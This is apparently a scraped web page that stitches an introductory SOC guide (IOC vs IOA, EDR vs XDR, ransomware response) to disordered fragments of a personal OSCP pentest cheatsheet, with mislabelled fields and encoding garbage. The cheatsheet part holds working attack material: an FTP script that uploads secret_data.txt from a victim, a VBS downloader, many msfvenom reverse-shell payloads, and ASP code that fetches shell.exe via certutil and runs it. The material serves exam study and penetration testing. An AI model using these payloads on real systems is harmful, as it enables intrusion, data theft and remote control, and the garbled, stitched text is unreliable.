content.text: Welcome to the Interactive SOC Guide

This guide provides a comprehensive overview of key concepts and questions related to Security Operations Centers (SOC). Use the navigation on the left to explore different topics. The content is sourced from a detailed cybersecurity document.

content.text: This is an interactive guide. Click on any topic in the sidebar to begin exploring the world of cybersecurity operations!
Indicators of Compromise (IOC) vs. Indicators of Attack (IOA)
These are critical concepts used to detect, understand, and respond to security incidents.

parts: . They are artifacts observed on a network or in operating systems that indicate a security incident may have occurred.

IOAs are indicators of potential malicious activity based on behavior.
IOCs are often used in post-incident analysis.
IOAs are used for real-time or near-real-time detection and prevention.

subItems: Correlation and Context: Analyzing the collected data to find correlations, patterns, and context.
TTPs: Understanding the tactics, techniques, and procedures of threat actors to predict and mitigate future attacks.
Proactive Defense: Using threat intelligence to anticipate and prevent potential threats by strengthening defenses.
Incident Response: Leveraging threat intelligence during and after an incident to understand the attack, identify attackers, and take appropriate remediation steps.

is an alert that incorrectly detects a threat. This is when an IDS identifies an activity as malicious, but it isn't.
is a state where a threat is not detected. This is when malicious activity happens but an IDS fails to detect it. False negatives are dangerous.

content.text: Summary: EDR is focused on endpoints. XDR provides a more comprehensive, cross-layer view of threats by integrating data from many different security sources.

items: Notice Early Signs: Ransom message, inaccessible files, slow performance.
Isolate the Device: Disconnect from the network immediately.
Use Security Software: Run an antivirus/anti-malware scan.

Scan for Malware if an attachment was downloaded.

items: Contain the Breach: Disconnect affected systems from the network.
Identify and Close Vulnerabilities: Investigate and patch.

content.text: Logs to Check: Access Logs, System Event Logs, Network Logs.

content.text: Audits are different from vulnerability assessments; they are more formal and focus on compliance and policies.
Key Phases of a Cybersecurity Audit

parts: The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going.

This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, used most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool used should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges between different stages of a penetration test are very blurry. Feel free to issue a PR if you want to help to improve the list.
*There are a number of tools you are not allowed to use during your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them in your exam. You can find detailed information about tool usage in the exam guidelines.*
**Use for educational purposes only!**

parts.text: Connect to A Share (As User John)
Download All Files From A Directory Recursively
Start Impacket SMB Server (With SMB2 Support)

parts: *If the syn scan is taking very long to complete, the following command is an alternative (no service detection).*
To fix `NT_STATUS_CONNECTION_DISCONNECTED` errors in new Kali installations add `client min protocol = NT1` to your `\etc\samba\smb.conf` file.

content.text: Connect to A Share (As User John)
Download All Files From A Directory Recursively

smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'

example:
smbclient \\\\192.168.0.1\\Data -U John -c 'prompt OFF;recurse ON;cd '\Users\John\';lcd '/tmp/John';mget *'

mkdir mpt
mount -t nfs -o soft 192.168.0.1:/backup mpt/

parts: **DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them during your exam. You can find detailed information about tool usage in the exam guidelines.**
Check request in BURP to see Post parameters. **-l or -L has to be set, even if there is no user to login with!**. Use `https-post-form` instead of `http-post-form` for HTTPS sites.
*Very helpful for chars that need to be escaped otherwise.*

content.text: Start Impacket SMB Server (With SMB2 Support)

#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

parts:
### Create FTP Script (On Victim)
 ```bash
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt
 ```

content.text:
echoÂ strUrlÂ =Â WScript.Arguments.Item(0)Â >Â wget.vbs
echoÂ StrFileÂ =Â WScript.Arguments.Item(1)Â >>Â wget.vbs
echoÂ ConstÂ HTTPREQUEST_PROXYSETTING_DEFAULTÂ =Â 0Â >>Â wget.vbs
echoÂ ConstÂ HTTPREQUEST_PROXYSETTING_PRECONFIGÂ =Â 0Â >>Â wget.vbs
echoÂ ConstÂ HTTPREQUEST_PROXYSETTING_DIRECTÂ =Â 1Â >>Â wget.vbs
echoÂ ConstÂ HTTPREQUEST_PROXYSETTING_PROXYÂ =Â 2Â >>Â wget.vbs
echoÂ DimÂ http,varByteArray,strData,strBuffer,lngCounter,fs,tsÂ >>Â wget.vbs
echoÂ Err.ClearÂ >>Â wget.vbs
echoÂ SetÂ httpÂ =Â NothingÂ >>Â wget.vbs
echoÂ SetÂ httpÂ =Â CreateObject("WinHttp.WinHttpRequest.5.1")Â >>Â wget.vbs
echoÂ IfÂ httpÂ IsÂ NothingÂ ThenÂ SetÂ httpÂ =Â CreateObject("WinHttp.WinHttpRequest")Â >>Â wget.vbs
echoÂ IfÂ httpÂ IsÂ NothingÂ ThenÂ SetÂ httpÂ =Â CreateObject("MSXML2.ServerXMLHTTP")Â >>Â wget.vbs
echoÂ IfÂ httpÂ IsÂ NothingÂ ThenÂ SetÂ httpÂ =Â CreateObject("Microsoft.XMLHTTP")Â >>Â wget.vbs
echoÂ http.OpenÂ "GET",strURL,FalseÂ >>Â wget.vbs
echoÂ http.SendÂ >>Â wget.vbs
echoÂ varByteArrayÂ =Â http.ResponseBodyÂ >>Â wget.vbs
echoÂ SetÂ httpÂ =Â NothingÂ >>Â wget.vbs
echoÂ SetÂ fsÂ =Â CreateObject("Scripting.FileSystemObject")Â >>Â wget.vbs
echoÂ SetÂ tsÂ =Â fs.CreateTextFile(StrFile,True)Â >>Â wget.vbs
echoÂ strDataÂ =Â ""Â >>Â wget.vbs
echoÂ strBufferÂ =Â ""Â >>Â wget.vbs
echoÂ ForÂ lngCounterÂ =Â 0Â toÂ UBound(varByteArray)Â >>Â wget.vbs
echoÂ ts.WriteÂ Chr(255Â AndÂ Ascb(Midb(varByteArray,lngCounterÂ +Â 1,1)))Â >>Â wget.vbs
echoÂ NextÂ >>Â wget.vbs
echoÂ ts.CloseÂ >>Â wget.vbs

content.text: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

parts: *Output in Hex, C Style, Exclude bad chars, Exitfunction thread:*

content.text: msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx

<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
